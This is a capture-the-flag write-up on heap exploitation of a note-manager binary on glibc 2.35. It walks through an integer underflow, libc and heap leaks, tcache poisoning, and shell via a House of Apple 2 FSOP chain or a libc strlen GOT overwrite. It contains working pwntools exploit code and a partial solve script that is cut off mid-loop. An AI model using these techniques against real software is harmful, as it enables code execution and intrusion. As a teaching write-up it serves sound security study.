---
title: "Tcademy"
summary: "Heap exploitation on glibc 2.35: integer underflow to massive heap overflow, and two paths to shell: libc GOT overwrite or House of Apple 2 FSOP."
date: 2026-02-08
releaseDate: "2026-02-09"
topics: ["pwn"]
ctfs: ["lactf-26"]
tags: ["heap", "tcache-poisoning", "house-of-apple-2", "libc-got"]
difficulty: hard
draft: false
---

> I'm telling you, tcache poisoning doesn't just happen due to double-frees!

```sh
nc chall.lac.tf 31144
```

---

The challenge is a classic heap note manager (create, delete, read) with only 2 note slots and a maximum allocation size of 0xf8. The vulnerability is an integer underflow in the size calculation that gives us a massive heap overflow. We'll cover two approaches to get a shell from there: the intended solution overwrites `strlen`'s GOT entry inside libc itself, and the alternative uses a House of Apple 2 FSOP chain. Both leak heap and libc addresses via the overflow primitive.

---

## The vulnerability

Here's the function that reads data into a note. Pay attention to the developer's comment:

```c
int read_data_into_note(int index, char *note, unsigned short size) {
    // I prevented all off-by-one's by forcing the size to be at least 7
    // less than what was declared by the user! I am so smart
    unsigned short resized_size = size == 8
        ? (unsigned short)(size - 7)
        : (unsigned short)(size - 8);
    int bytes = read(0, note, resized_size);
    if (bytes < 0) {
        puts("Read error");
        exit(1);
    }
    if (note[bytes-1] == '\n') note[bytes-1] = '\x00';
}
```

The developer was so focused on preventing off-by-one errors that they missed something much worse. The special case for `size == 8` makes `resized_size = 1`, and all other sizes get 8 subtracted. Sounds safe, right?

Here's how the note gets created:

```c
void create_note() {
    int index = get_note_index();
    unsigned short size;
    // ...
    scanf("%hu", &size);
    if (size < 0 || size > 0xf8) {
        puts("Invalid size!!!");
        exit(1);
    }
    notes[index] = malloc(size);
    printf("Data: ");
    read_data_into_note(index, notes[index], size);
}
```

The size check allows `size = 0`. And when `size = 0`:

- `size == 8` is false, so we take the else branch
- `resized_size = (unsigned short)(0 - 8) = 65528`

The subtraction wraps around because `unsigned short` can't go negative, it wraps to 65528 (0xfff8). Meanwhile, `malloc(0)` returns the smallest possible chunk (0x20 bytes). So `read()` will happily write 65528 bytes into a 0x20-byte allocation. The developer prevented the off-by-one and introduced a 65KB heap overflow instead.

---

## Background: glibc heap internals

If you're already comfortable with glibc malloc, tcache, safe-linking, and bin mechanics, [skip ahead to the exploit strategy](#exploit-strategy).

### Chunks

Every `malloc()` allocation lives inside a "chunk." A chunk has a 0x10-byte header (two 8-byte fields) followed by user data. Internally, glibc tracks the chunk by a pointer to the **header** (where `prev_size` starts). But `malloc()` returns a pointer **0x10 bytes later**, to the start of the user data. So when you see `malloc()` return `0x5555deadbef0`, the actual chunk header starts at `0x5555deadbee0`.

{{< mermaid >}}
block-beta
  columns 2
  A["prev_size (8 bytes)"]:1 B["size | flags (8 bytes)"]:1
  C["user data\n(what malloc returns)"]:2
  style A fill:#2d333b,stroke:#444
  style B fill:#2d333b,stroke:#444
  style C fill:#1a6334,stroke:#2ea043
{{< /mermaid >}}

The `size` field includes metadata flags in the low 3 bits. The most important flag is bit 0 (`PREV_INUSE`), which indicates whether the previous chunk is allocated. When a chunk is freed, its user data area gets repurposed to store linked-list pointers (`fd` and `bk`).

`malloc(0)` returns a 0x20-size chunk (the minimum). `malloc(0xf8)` returns a 0x100-size chunk. The size always includes the 0x10 header and is rounded up to the nearest 0x10.

### Tcache

Tcache (thread-local cache) is the first place glibc looks when allocating or freeing small chunks. Each thread has bins for sizes 0x20, 0x30, ..., 0x410, each holding up to 7 chunks.

When you free a chunk that fits in tcache:
1. The chunk goes onto the front of the tcache bin (LIFO stack)
2. The first 8 bytes of user data become the `fd` pointer (next entry in the bin)

When you malloc a chunk that has a matching tcache entry:
1. Pop the first entry from the tcache bin
2. Return it immediately (no coalescing, no checks in older glibc)

### Safe-linking (glibc 2.32+)

Here's the catch for modern exploitation. Since glibc 2.32, tcache (and fastbin) `fd` pointers are [**mangled**](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L349):

```c
#define PROTECT_PTR(pos, ptr)  ((size_t)(pos) >> 12) ^ (size_t)(ptr)
#define REVEAL_PTR(pos, ptr)   PROTECT_PTR(pos, ptr)  // same operation (XOR is self-inverse)
```

When a chunk is freed into tcache, instead of storing `fd = next_chunk`, glibc stores:

```
fd = (address_of_fd_field >> 12) XOR next_chunk_address
```

To poison the tcache, we need to know `address_of_fd_field >> 12`, which means we need a heap leak first.

For the very first chunk in an empty tcache bin, `next_chunk_address = NULL`, so:

```
fd = (address_of_fd_field >> 12) XOR 0 = address_of_fd_field >> 12
```

This gives us a heap leak for free: if we can read the `fd` of a singly-freed tcache chunk, we get `heap_addr >> 12`.

### Unsorted bin, large bins, and small bins

When a chunk is too large for tcache (> 0x410) or tcache is full, it goes to the **unsorted bin**: a doubly-linked list hanging off `main_arena` in libc.

When malloc needs a chunk and tcache is empty, it searches the unsorted bin. Chunks that don't match get **sorted** into size-appropriate bins:

- **Small bins**: for sizes < 0x400 (exact-size bins, like tcache but doubly-linked)
- **Large bins**: for sizes >= 0x400 (range-based, sorted by size)

The key insight for leaking libc: when a chunk is alone in a bin, its `fd` and `bk` pointers point back to the bin header inside `main_arena`, which lives at a known offset from the libc base.

### libc's internal GOT

Just like the main binary, `libc.so.6` itself has a GOT (Global Offset Table) for resolving function calls. Functions like `strlen`, `memcpy`, and `strncpy` use GNU **ifunc** (indirect functions) to select a CPU-optimized implementation at runtime (e.g., an AVX2 `strlen` if the CPU supports it). These ifunc GOT entries need to be writable during resolution.

glibc 2.35 is built with **Partial RELRO**, not Full RELRO. That means the ifunc GOT entries remain writable for the entire lifetime of the process, even after resolution completes. This was a known weakness, and newer glibc versions (2.39+) started hardening this by making libc's own GOT read-only after ifunc resolution. But glibc 2.35 predates that fix, so these entries are fair game.

This matters because `puts()` internally calls `strlen()` to determine the string length. If we can overwrite `strlen`'s GOT entry inside libc with `system`, then `puts(str)` becomes `system(str)`. On glibc 2.35 (Ubuntu 22.04), pwntools can resolve these directly: `libc.got['strncpy']` and `libc.got['strlen']` are the writable ifunc GOT entries, sitting just above the RELRO boundary.

---

## Exploit strategy

Both approaches share the same setup:

1. **Forge a fake 0x200 chunk** using the heap overflow, iteratively filling tcache and pushing one into the unsorted bin
2. **Leak libc** by overflowing non-null padding up to the unsorted bin `fd` pointer, then reading through it with `puts()`
3. **Leak the heap** the same way: overflow padding reaches a tcache chunk's mangled `fd`

Then the approaches diverge:

- **Approach 1 (intended)**: Poison tcache → overwrite `strlen` GOT in libc with `system` → `puts("/bin/sh")` triggers `system("/bin/sh")`
- **Approach 2 (alternative)**: Poison tcache → overwrite `_IO_list_all` → trigger House of Apple 2 FSOP via `exit()`

---

## Phase 1: Iterative tcache fill → unsorted bin

We need a freed chunk in the **unsorted bin** to get a libc leak. The unsorted bin is a doubly-linked list managed by glibc's allocator, and its list head lives inside `main_arena`, a global struct in libc that holds all of the allocator's bookkeeping (bin heads, top chunk pointer, etc.). When a chunk is the only entry in the unsorted bin, its `fd` and `bk` both point back to the list head at `main_arena + 96`, which is a known fixed offset inside libc. Leaking either pointer gives us libc's base address.

Chunks only go to the unsorted bin when their tcache bin is full (7 entries). Otherwise, `free()` puts them in tcache, where `fd` pointers are heap addresses (useless for a libc leak).

### Why forge a different size?

Our max allocation is 0xf8, which gives us chunk size 0x100 at most. We only have 2 note slots. If we kept freeing real 0x100 chunks, the next `malloc(0xf8)` would just pull them right back out of `tcache[0x100]`, and we'd never fill it. The trick is to **forge a size that doesn't match what we allocate**. We allocate 0x20 chunks (via `size=0xc`), but overflow to rewrite the chunk header to `0x201` before freeing. The low 3 bits of the size field are flags, not part of the size: bit 0 is `PREV_INUSE` (indicating the previous chunk is allocated), which must be set or glibc thinks the previous chunk is free and tries to coalesce. So `0x201` = size 0x200 with `PREV_INUSE` set. Glibc sees a 0x200 chunk and puts it in `tcache[0x200]`. Our subsequent `malloc(0xc)` allocations pull from `tcache[0x20]`, so the 0x200 entries **stay** in tcache and accumulate. After 7 iterations, `tcache[0x200]` is full, and the 8th free goes to the unsorted bin.

### The loop

Each iteration: create two 0x20 chunks, free note0 (goes to `tcache[0x20]`), then re-create note0 with `size=4` (triggering the overflow) to rewrite note1's chunk header from `0x21` to `0x201`. Then free note1 (glibc sees 0x200), free note0.

```python
for i in range(8):
    create(io, 0, 0xc, b'X')    # note0: 0x20 chunk
    create(io, 1, 0xc, b'X')    # note1: 0x20 chunk
    delete(io, 0)                # free note0 -> tcache[0x20]

    # Overflow from note0 to forge note1's size as 0x201
    overflow = b'A' * (0x10 + i * 0x20)  # padding grows each iteration
    overflow += p64(0x20) + p64(0x201)   # forged prev_size + size
    overflow += b'A' * 0x18              # chunk body padding
    overflow += p64(0x20d31 - i * 0x20)  # preserve top chunk size

    if i == 7:  # last iteration: unsorted bin needs fence chunks
        overflow += b'A' * 0x1d8
        overflow += p64(0x21) + b'A' * 0x18 + p64(0x21)

    create(io, 0, 4, overflow)   # size=4 -> resized to 65532, overflow!
    delete(io, 1)                # free forged 0x200 chunk
    delete(io, 0)
```

### Why the padding grows

On each iteration, note0 is recycled from `tcache[0x20]` at the same address (heap+0x290). But note1 is allocated fresh from the top chunk each time, because its previous 0x20 chunk was freed as a 0x200 entry into a different tcache bin. So note1 moves 0x20 bytes further from note0 on each pass, and the overflow padding grows by 0x20 to bridge the increasing gap.

### Top chunk size

The top chunk is the free space at the end of the heap. Every allocation carves bytes from it, and glibc tracks its size in the chunk header. If it's wrong, future allocations crash.

The initial heap is 0x21000 bytes (glibc's default `brk` allocation). At the start of the loop, the heap looks like:

{{< mermaid >}}
block-beta
  columns 2
  a["0x000"]:1 A["tcache_perthread_struct (0x290)"]:1
  b["0x290"]:1 B["note0 (0x20)"]:1
  c["0x2B0"]:1 C["note1 (0x20)"]:1
  d["0x2D0"]:1 D["top chunk (0x20D31)"]:1
  style a fill:none,stroke:none,color:#8b949e
  style b fill:none,stroke:none,color:#8b949e
  style c fill:none,stroke:none,color:#8b949e
  style d fill:none,stroke:none,color:#8b949e
  style A fill:#2d333b,stroke:#444
  style B fill:#1a6334,stroke:#2ea043
  style C fill:#1a6334,stroke:#2ea043
  style D fill:#1c3049,stroke:#388bfd
{{< /mermaid >}}

So the top chunk size = `0x21000 - 0x2D0` = `0x20D30`, plus the PREV_INUSE bit = `0x20D31`. Our overflow writes past note1 into the top chunk header, so we need to preserve this value. It shrinks by 0x20 each iteration as note1 moves further out, consuming more space from the top.

### Fence chunks (iteration 7 only)

The first 7 frees go into tcache, which has almost no validation: it doesn't check neighboring chunk headers at all. But the 8th free goes to the **unsorted bin**, which is pickier.

You might wonder: normally, freeing a chunk adjacent to the top chunk works fine, so why do we need fences? The difference is that normally, [`_int_free`](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4302) detects that the next chunk IS the top chunk (`nextchunk == av->top`) and takes a special consolidate-with-top path that skips most checks. But our forged 0x200 chunk's "next chunk" (at `chunk + 0x200`) lands somewhere in the **middle** of the top chunk, not at its actual header. Glibc doesn't recognize it as the top chunk, so it takes the normal code path, which does three checks:

1. **Next chunk's PREV_INUSE bit**: at `chunk + size`, the next chunk's size field must have bit 0 set (PREV_INUSE). Otherwise glibc thinks our chunk is already free and aborts with "double free or corruption".
2. **Next chunk's size must be reasonable**: glibc checks `2 * SIZE_SZ < next_size < av->system_mem`, where `SIZE_SZ` is `sizeof(size_t)` (8 on 64-bit, so the minimum is 0x10), and `av` is the `malloc_state*` pointer to the arena (i.e., `main_arena`), whose `system_mem` field tracks how much memory the arena has obtained from the OS via `brk` (0x21000 in our case). A zero or impossibly large size triggers "invalid next size".
3. **Next-next chunk's PREV_INUSE bit**: glibc reads the chunk at `nextchunk + nextsize` to check its PREV_INUSE bit. If it's clear, glibc thinks `nextchunk` is also free and tries to **forward-consolidate** by unlinking it from its bin. That unlink follows `fd`/`bk` pointers, which would crash on our garbage data.

We write two fake 0x21 headers as "fences" after the forged chunk. Here's how glibc navigates them:

{{< mermaid >}}
block-beta
  columns 5
  A["forged 0x200 chunk"]:2 B["fence₁ (0x21)"]:1 C["0x18 body"]:1 D["fence₂ (0x21)"]:1
  style A fill:#1c3049,stroke:#388bfd
  style B fill:#5a3a1e,stroke:#d29922
  style C fill:#5a3a1e,stroke:#d29922
  style D fill:#1c3049,stroke:#388bfd
{{< /mermaid >}}

**Step 1**: glibc looks at `chunk + 0x200` (the forged size) and finds fence₁. It reads the size field: `0x21` = size 0x20 with PREV_INUSE set. This satisfies checks 1 (PREV_INUSE) and 2 (0x20 is a valid size).

**Step 2**: glibc then needs to check if fence₁ itself is free (to decide about forward consolidation). It does this by looking at fence₁'s "next chunk", which is at `fence₁ + 0x20` (fence₁'s size). Remember the chunk layout from earlier:

{{< mermaid >}}
block-beta
  columns 4
  a["fence₁"]:1 B["size: 0x21\n(8 bytes)"]:1 C["chunk body\n(0x18 bytes)"]:1 D["fence₂\nsize: 0x21"]:1
  style a fill:none,stroke:none,color:#8b949e
  style B fill:#5a3a1e,stroke:#d29922
  style C fill:#5a3a1e,stroke:#d29922
  style D fill:#1c3049,stroke:#388bfd
{{< /mermaid >}}

Fence₁ is a 0x20-size chunk: 0x8 bytes for the size field + 0x18 bytes of body = 0x20 total. So `fence₁ + 0x20` lands exactly at fence₂. Glibc reads fence₂'s PREV_INUSE bit (set), concludes fence₁ is in-use, and skips consolidation. Check 3 satisfied.

The 0x18 bytes between the two fences isn't arbitrary padding. It's fence₁'s chunk body, and it's exactly the right size to make glibc's `fence₁ + size` arithmetic land on fence₂.

This is only needed on the last iteration because that's the only free that hits the unsorted bin path.

---

## Phase 2: Libc leak

After the loop, the unsorted bin contains a chunk with `fd` and `bk` pointing back to the unsorted bin's list head inside `main_arena`. But why is that at offset 96 (0x60)? Let's trace through the real glibc source.

The [`malloc_state` struct](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1831) (`malloc/malloc.c`) defines `main_arena`'s layout:

```c
struct malloc_state
{
  __libc_lock_define (, mutex);       // 0x00: 4 bytes
  int flags;                          // 0x04: 4 bytes
  int have_fastchunks;                // 0x08: 4 bytes (+4 padding)
  mfastbinptr fastbinsY[NFASTBINS];  // 0x10: 10 * 8 = 80 bytes
  mchunkptr top;                      // 0x60: 8 bytes
  mchunkptr last_remainder;           // 0x68: 8 bytes
  mchunkptr bins[NBINS * 2 - 2];     // 0x70: the bin array
  // ...
};
```

The unsorted bin is bin index 1. Glibc accesses bins through the [`bin_at` macro](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1541) that treats the bins array as if each pair of entries is the `fd`/`bk` of a fake `malloc_chunk`:

```c
#define bin_at(m, i) \
  (mbinptr) (((char *) &((m)->bins[((i) - 1) * 2])) \
             - offsetof (struct malloc_chunk, fd))
```

Since `fd` is at offset 0x10 in `malloc_chunk` (after the 8-byte `prev_size` and 8-byte `size` header fields), `bin_at(main_arena, 1)` points 0x10 bytes **before** `bins[0]`. That's `0x70 - 0x10` = `0x60` = 96 bytes into `main_arena`. When a freed chunk is alone in the unsorted bin, its `fd` and `bk` both point back to this fake chunk header, giving us `main_arena + 96`.

We need to read this pointer.

The trick: overflow from note0 with a long padding of `'A'` bytes that bridges the gap between note0 and the unsorted bin chunk's data area. When we call `puts(notes[0])`, it prints the `'A'` padding and **continues past it** into the unsorted bin `fd` pointer, until it hits a null byte.

{{< mermaid >}}
block-beta
  columns 5
  a["0x2A0"]:1 A["note0\ndata"]:1 B["'A' * 0x100 overflow"]:2 C["fd\n→ main_arena+96"]:1
  style a fill:none,stroke:none,color:#8b949e
  style A fill:#1a6334,stroke:#2ea043
  style B fill:#5a3a1e,stroke:#d29922
  style C fill:#6e3630,stroke:#f85149
{{< /mermaid >}}

`puts()` starts at note0's data (0x2A0), reads through the 0x100 bytes of `'A'` padding (no null bytes), and continues into the `fd` pointer. Since libc addresses look like `0x7f??????????`, the low 6 bytes are non-null in little endian, so `puts()` prints them before hitting the null high bytes.

```python
create(io, 0, 4, b'A' * 0x100)  # overflow: 0x100 'A's reach the fd
data = show(io, 0)               # puts() prints: 'A'*0x100 + fd bytes
UNSORTED_FD = 0x21ace0  # main_arena + 96 (unsorted bin fd)
libc.address = u64(data[0x100:].ljust(8, b'\x00')) - UNSORTED_FD
```

---

## Phase 3: Heap leak

For tcache poisoning, we need to know `heap_addr >> 12` to compute the safe-linking mangled pointer. We leak this the same way as the libc leak: overflow padding + `puts()`, but this time targeting a tcache chunk's mangled `fd`.

First, we need to fix up the heap. The libc leak overwrote everything with `'A'` bytes, corrupting the unsorted bin chunk's `fd`/`bk` pointers and surrounding headers. If we leave it like this, glibc will crash on the next allocation that touches the unsorted bin. We use another overflow to restore valid metadata:

```python
unsorted_fd = libc.address + UNSORTED_FD
delete(io, 0)
create(io, 0, 4, b'A' * 0xf8 + p64(0x21) + p64(unsorted_fd) * 2 +
                  p64(0x20) + p64(0x20c50))
```

What each piece restores (starting from note0's data at 0x2A0):

{{< mermaid >}}
block-beta
  columns 5
  a["0x2A0"]:1 A["'A' * 0xf8\npadding"]:1 B["0x21\nchunk hdr"]:1 C["fd + bk\n→ unsorted bin"]:1 D["top chunk\nsize"]:1
  style a fill:none,stroke:none,color:#8b949e
  style A fill:#2d333b,stroke:#444
  style B fill:#5a3a1e,stroke:#d29922
  style C fill:#6e3630,stroke:#f85149
  style D fill:#1c3049,stroke:#388bfd
{{< /mermaid >}}

- `b'A' * 0xf8` - padding to reach the corrupted area
- `p64(0x21)` - restores the chunk header before the unsorted bin chunk (size 0x20 + PREV_INUSE)
- `p64(unsorted_fd) * 2` - restores the unsorted bin chunk's `fd` and `bk` back to `main_arena + 96`, so the allocator sees a valid doubly-linked list
- `p64(0x20) + p64(0x20c50)` - restores `prev_size` and the top chunk size so future allocations from top don't crash

Then we set up a tcache[0x20] entry to leak from. When note1 is freed into an empty tcache bin, its `fd` becomes `PROTECT_PTR(pos, NULL)` = `pos >> 12` (the mangler value):

```python
create(io, 1, 0xc, b'X')
delete(io, 1)    # tcache[0x20]: note1 (fd = &fd >> 12)
delete(io, 0)    # tcache[0x20]: note0 -> note1
```

{{< mermaid >}}
flowchart LR
  T["tcache[0x20]"] --> A["note0"] --> B["note1 (fd = heap >> 12)"] --> N["NULL"]
  style T fill:#2d333b,stroke:#444
  style A fill:#1a6334,stroke:#2ea043
  style B fill:#6e3630,stroke:#f85149
  style N fill:none,stroke:#444,color:#8b949e
{{< /mermaid >}}

note1 was freed first into an empty bin, so its `fd = pos >> 12`. note0 was freed second, so it points to note1.

Now the same overflow trick: re-create note0 with `size=4`, write 0x100 `'A'` bytes that bridge from note0's data all the way to note1's `fd`:

```python
create(io, 0, 4, b'A' * 0x100)
data = show(io, 0)
mangler = u64(data[0x100:].ljust(8, b'\x00'))
```

{{< mermaid >}}
block-beta
  columns 5
  a["0x2A0"]:1 A["note0\ndata"]:1 B["'A' * 0x100 overflow"]:2 C["fd\n= heap >> 12"]:1
  style a fill:none,stroke:none,color:#8b949e
  style A fill:#1a6334,stroke:#2ea043
  style B fill:#5a3a1e,stroke:#d29922
  style C fill:#6e3630,stroke:#f85149
{{< /mermaid >}}

The mangler value has the form `0x00000000055xxxxx`: the low 4-5 bytes are non-null, which `puts()` prints. The high bytes are zero, but `ljust(8, b'\x00')` fills those in. This gives us the exact value we need for `PROTECT_PTR`.

---

## Phase 4: Tcache poisoning

Now we have both heap and libc addresses. We need to make `malloc()` return a pointer to `_IO_list_all` in libc. The technique: **tcache poisoning**.

The idea:
1. Free two 0x30-size chunks into the tcache: `chunk_A -> chunk_B -> NULL`
2. Overwrite `chunk_A`'s `fd` with a mangled pointer to `_IO_list_all`
3. First `malloc(0x20)` returns `chunk_A`
4. Second `malloc(0x20)` follows the poisoned `fd` and returns `_IO_list_all`

Before poisoning:

{{< mermaid >}}
flowchart LR
  T["tcache[0x30]"] --> A["chunk_A"] --> B["chunk_B"] --> N["NULL"]
  style T fill:#2d333b,stroke:#444
  style A fill:#1a6334,stroke:#2ea043
  style B fill:#1a6334,stroke:#2ea043
  style N fill:none,stroke:#444,color:#8b949e
{{< /mermaid >}}

After overflow corrupts `chunk_A`'s fd:

{{< mermaid >}}
flowchart LR
  T["tcache[0x30]"] --> A["chunk_A"] --> IO["_IO_list_all\n(libc)"]
  style T fill:#2d333b,stroke:#444
  style A fill:#1a6334,stroke:#2ea043
  style IO fill:#6e3630,stroke:#f85149
{{< /mermaid >}}

The safe-linked `fd` we need to write:

```python
mangled_target = mangler ^ io_list_all
```

Where `mangler` is the `heap_addr >> 12` value we recovered from the heap leak (Phase 3).

We use a second overflow (same `size=0` trick) to write this poisoned `fd` into the freed tcache chunks. The overflow payload also contains our **fake FILE struct** for the FSOP chain, placed at a known heap offset. Pwntools' `flat()` is very useful here: instead of slicing into a bytearray at magic offsets, we describe the payload as `{offset: data}`:

```python
o2 = flat({
    0xb0: p64(mangled_target),   # poisoned fd -> _IO_list_all
    0x160: bytes(fp),            # fake FILE struct
    0x248: wide_data,            # fake _wide_data
    0x330: wide_vtable,          # fake wide vtable
    # ...
}, filler=b'\x00', length=0x400)
```

---

## Phase 5: House of Apple 2 FSOP

### What is `_IO_list_all`?

In glibc, every open FILE (`stdin`, `stdout`, `stderr`, and any `fopen()`'d files) is a `_IO_FILE` struct. These are linked together in a singly-linked list, and `_IO_list_all` is the global pointer to the head of that list. Normally it points to `stderr → stdout → stdin → NULL`.

### What is FSOP?

FSOP (File Stream Oriented Programming) abuses the fact that glibc walks this list and calls **virtual functions** on each FILE in certain situations. The most useful trigger is `exit()`: when a program exits, glibc calls `_IO_flush_all_lockp()` to flush every open file's buffers (write any buffered data out to the underlying file descriptor). For each FILE in the list, it calls the `overflow` function from the FILE's **vtable** (a function pointer table at offset 0xd8 in the struct). Normally, `overflow` is what writes a FILE's internal buffer out to the actual file descriptor when the buffer is full (the buffer "overflows", so it needs to be drained). During exit, it's called one last time to flush any remaining data.

If we can overwrite `_IO_list_all` to point at a **fake FILE struct** we control, glibc will call whatever function pointer we put in the vtable. That's arbitrary code execution. And `_IO_list_all` is not protected by RELRO. It's a regular global variable in libc's writable data segment (`.bss`), not a GOT entry or relocation. RELRO only protects the GOT. Glibc needs to modify `_IO_list_all` at runtime whenever a file is opened or closed (e.g., `fopen()` prepends to the list), so it has to be writable. We use our tcache poisoning from Phase 4 to make `malloc()` return a pointer to it, then write the address of our fake FILE. This replaces the entire list: the real FILEs (stderr, stdout, stdin) are no longer reachable, and glibc only processes our fake FILE before hitting NULL.

### Why House of Apple 2?

In glibc 2.24+, the main vtable pointer is validated by `IO_validate_vtable()`. It must point within a legitimate vtable section, so we can't just point it at `system` directly. House of Apple 2 bypasses this by setting the vtable to `_IO_wfile_jumps` (a real, validated vtable). This routes execution through the **wide character** code path, which uses a second vtable (`_wide_vtable`) stored inside `_wide_data`. This second vtable is **not validated**, giving us a clean function pointer hijack.

### The call chain in glibc source

We've written `fake_file_addr` to `_IO_list_all` via tcache poisoning. When `exit(0)` is called, glibc walks the FILE list and calls each FILE's vtable `overflow`. Since we set the vtable to `_IO_wfile_jumps`, the first function called is `_IO_wfile_overflow`. Here's the real glibc 2.35 source ([`libio/wfileops.c`](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/wfileops.c#L409)):

```c
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) { /* ... error ... */ }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      if (f->_wide_data->_IO_write_base == 0)
        {
          _IO_wdoallocbuf (f);   // <-- we reach here
          // ...
```

**Constraint**: `_flags` must not have `_IO_NO_WRITES` (0x8) or `_IO_CURRENTLY_PUTTING` (0x800), and `_wide_data->_IO_write_base` must be NULL. Our `" sh\x00"` flags value (0x00006873) satisfies all of these.

Next, [`_IO_wdoallocbuf`](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/wgenops.c#L371) (`libio/wgenops.c`):

```c
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;                          // must be NULL to continue
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)  // <-- dispatches through wide vtable
      return;
  // ...
```

**Constraint**: `_wide_data->_IO_buf_base` must be NULL and `_flags` must not have `_IO_UNBUFFERED` (0x2).

Finally, [`_IO_WDOALLOCATE`](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L135) is a macro (`libio/libioP.h`) that dispatches through the **wide vtable**:

```c
#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
// expands to:
// (FP->_wide_data->_wide_vtable->__doallocate)(FP)
```

The `FP` pointer is passed as the first argument. Since `_flags` is at offset 0 of the FILE struct and we set it to `" sh\x00"`, the call becomes `system(" sh")`.

The full chain:

```
exit()
  → _IO_flush_all_lockp()
    → _IO_wfile_overflow(fp, EOF)           vtable->overflow
      → _IO_wdoallocbuf(fp)                _wide_data->_IO_write_base == NULL
        → _IO_WDOALLOCATE(fp)              _wide_data->_IO_buf_base == NULL
          → fp->_wide_data->_wide_vtable->__doallocate(fp)
            → system(" sh")                offset 0x68 in our fake wide vtable
```

### Building the fake FILE

A `_IO_FILE` struct is large (~0xe8 bytes) with many fields. We only need to set a few to steer execution. Pwntools provides `FileStructure` for constructing these with named fields instead of raw byte offsets:

```python
fake_file_addr = heap_base + 0x400  # known location on heap

fp = FileStructure()
fp.flags = u64(b' sh\x00\x00\x00\x00\x00')  # doubles as system() argument!
fp._IO_buf_base = 0                            # triggers _IO_wdoallocbuf
fp._lock = fake_file_addr + 0xe0               # must point to writable NULL
fp._wide_data = fake_file_addr + 0xe8          # -> our fake wide data struct
fp.vtable = io_wfile_jumps                     # _IO_wfile_jumps (legitimate vtable)

# _mode is at offset 0xc0, inside FileStructure's "unknown2" region
mode_data = bytearray(48)
mode_data[0x18:0x1c] = p32(1)  # _mode = 1 (enables wide code path)
fp.unknown2 = bytes(mode_data)
```

The `_flags` field is at offset 0 of the FILE struct. When `system()` is called, its argument is a pointer to the FILE struct itself, so the first bytes of `_flags` become the command string. We set it to `" sh\x00"` (space + sh), which `system()` interprets as running `/bin/sh`.

### The wide data and wide vtable

The `_wide_data` struct and its vtable don't have pwntools helpers, but we can use `flat()` to place data at named offsets rather than slicing bytearrays:

```python
# Fake _wide_data (pointed to by fp._wide_data)
wide_data = flat({
    0x18: p64(0),    # _IO_write_base = 0
    0x20: p64(1),    # _IO_write_ptr = 1 (must be > write_base)
    0x30: p64(0),    # _IO_buf_base = 0
    0xe0: p64(wide_vtable_addr),  # _wide_vtable -> our fake vtable
}, filler=b'\x00', length=0xe8)

# Fake wide vtable
wide_vtable = flat({
    0x68: p64(system_addr),  # __doallocate offset
}, filler=b'\x00', length=0x70)
```

The chain: `_IO_wfile_overflow` sees `write_ptr > write_base`, checks `_IO_buf_base == NULL`, calls `_IO_wdoallocbuf`, which calls `_IO_WDOALLOCATE`. This dereferences `_wide_vtable->__doallocate` (offset 0x68), which we've pointed to `system`.

---

## Alternative: libc GOT overwrite (intended solution)

The intended solution skips FSOP entirely. Instead of building fake FILE structs and triggering `exit()`, it overwrites `strlen`'s GOT entry inside libc with `system`. This works because `puts()` internally calls `strlen()` to determine the string length.

After obtaining the same libc and heap leaks (phases 1-3), the endgame is:

```python
# Tcache poison targeting strlen's ifunc GOT slot in libc
strlen_got = libc.got['strncpy']  # strncpy and strlen GOT entries are adjacent
poisoned_fd = mangler ^ strlen_got
```

Same tcache poisoning setup as the FSOP approach (two 0x30 entries, overflow to corrupt `fd`), but instead of pointing at `_IO_list_all`, we point at libc's internal GOT. The two qwords at `libc.got['strncpy']` are the resolved ifunc entries for `strncpy` and `strlen`:

```python
create(io, 1, 0x20, b'/bin/sh\x00')   # consumes first tcache entry, note1 = "/bin/sh"
delete(io, 0)
create(io, 0, 0x20,
    p64(libc.sym['strncpy']) +          # preserve strncpy's resolved address
    p64(libc.sym['system'])            # overwrite strlen -> system
)
```

Now `strlen` points to `system`. The trigger:

```python
show(io, 1)  # puts("/bin/sh") -> strlen("/bin/sh") -> system("/bin/sh")
```

{{< mermaid >}}
flowchart LR
  P["puts('/bin/sh')"] -->|"calls internally"| G["libc GOT: strlen"]
  G -->|"resolved to"| S["system('/bin/sh')"]
  style P fill:#2d333b,stroke:#444
  style G fill:#5a3a1e,stroke:#d29922
  style S fill:#6e3630,stroke:#f85149
{{< /mermaid >}}

That's it. No fake FILE structs, no wide vtables, no exit trigger. Just a single function pointer swap. This works because libc.so.6 on Ubuntu 22.04 (glibc 2.35) has Partial RELRO, leaving the ifunc GOT entries writable at `libc.got['strncpy']` and `libc.got['strlen']`, just above the read-only RELRO boundary.

---

## Solve scripts

<details>
<summary>House of Apple 2 FSOP</summary>

```python
from pwn import *

context.arch = 'amd64'
exe = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

mangle = lambda ptr, pos: ptr ^ (pos >> 12)

def create(io, idx, size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendlineafter(b'Size: ', str(size).encode())
    io.sendafter(b'Data: ', data)

def delete(io, idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index: ', str(idx).encode())

def show(io, idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index: ', str(idx).encode())
    return io.recvline(keepends=False)

UNSORTED_FD = 0x21ace0  # main_arena + 96 (unsorted bin fd)

io = remote('chall.lac.tf', 31144) if args.REMOTE else process([exe.path])

# ── Phase 1: Fill tcache[0x200] + push one to unsorted bin ──

for i in range(8):
    create(io, 0, 0xc, b'X')
    create(io, 1, 0xc, b'X')
